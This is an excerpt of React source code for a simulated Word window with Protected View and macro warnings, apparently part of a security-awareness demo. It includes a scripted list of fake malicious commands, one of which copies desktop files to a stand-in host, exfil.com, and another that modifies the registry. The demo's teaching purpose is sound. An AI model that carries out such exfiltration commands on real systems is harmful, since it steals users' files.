...
const maliciousCommands = [
  ...
  {
    command: "copy C:/Users/*/Desktop/*.* https://exfil.com/data",
    delay: 1500,
  },
  {
    command: "modify registry HKEY_LOCAL_MACHINE/Software/Microsoft/Windows",
    delay: 1100,
  },
  ...
  <div className="bg-[#eaf1fb] border-b border-[#c7d6ec] px-4 pt-1 pb-2 flex flex-col">
    <div className="flex gap-4 mb-2">
      {ribbonTabs.map((tab) => (
        <div
          key={tab}
          className="px-2 py-1 text-sm font-semibold text-[#2b579a] hover:bg-[#dbe7fa] rounded cursor-pointer select-none"
        >
          {tab}
        </div>
      ))}
    ...
    <div className="flex gap-8 items-end">
      <div className="flex flex-col gap-1">
        ...
        <div className="flex gap-1">
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">
            Paste
          </button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">
            Cut
      ...
      <div className="flex flex-col gap-1">
        ...
        <div className="flex gap-1 items-center">
          <button
            className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm font-bold"
            onClick={() => onFormat("bold")}
          >
            B
          </button>
          <button
            className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm italic"
            onClick={() => onFormat("italic")}
          >
            I
          </button>
          <button
            className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm underline"
            onClick={() => onFormat("underline")}
          >
            U
          </button>
          <select
            className="ml-2 border border-[#c7d6ec] rounded text-xs px-1 py-1"
          ...
          <input
            type="color"
            className="ml-2 w-6 h-6 p-0 border border-[#c7d6ec] rounded"
      ...
      <div className="flex flex-col gap-1">
        ...
        <div className="flex gap-1">
          <button
            className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm"
            title="Bulleted List"
            onClick={() => onList("insertUnorderedList")}
          >
            • List
          </button>
          <button
            className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm"
            title="Numbered List"
            onClick={() => onList("insertOrderedList")}
          >
            1. List
          </button>
        </div>
...
const Word = ({ isAppOpen, toggleWord, bounds }) => {
  ...
  const handleEnableEditing = () => {
    const confirmed = window.confirm(
      "Warning: Enabling editing can harm your computer. Are you sure you want to proceed?"
    );
    if (confirmed) {
        ...
        >
          ...
          <div className="title-bar bg-[#2b579a] flex items-center justify-between h-10 px-4 select-none">
            <div className="flex items-center gap-2">
              <span className="bg-white w-6 h-6 rounded-sm flex items-center justify-center text-[#2b579a] font-bold text-lg">
                W
              </span>
          ...
          {protectedView && (
            <div className="bg-yellow-200 border-b border-yellow-400 text-yellow-900 flex items-center justify-between px-6 py-2 text-sm font-medium">
              <span>
                ...
                viruses. Unless you need to edit, it's safer to stay in
                Protected View.
              </span>
              <button
          ...
          {showMacroWarning && (
            <div className="bg-yellow-100 border-b border-yellow-300 text-yellow-800 flex items-center justify-between px-6 py-2 text-sm font-medium">
              <span>
                ...
                been disabled. This document contains macros that provide
          ...
          <div className="flex-1 flex justify-center items-start overflow-auto bg-[#f3f6fb]">
            <div className="mt-6 mb-4 w-[60%] min-h-[70%] bg-white shadow-lg rounded p-8 relative border border-[#e3e3e3] flex flex-col">
              ...
              <div
                ...
                style={{
                  minHeight: "20em",
                  backgroundColor: protectedView ? "#f9f9f9" : "white",
                }}
          ...
          {/* Status Bar */}
          <StatusBar
            text={`Page 1 of 1    |    ${getWordCount()} word${
              getWordCount() === 1 ? "" : "s"
            }`}
          />
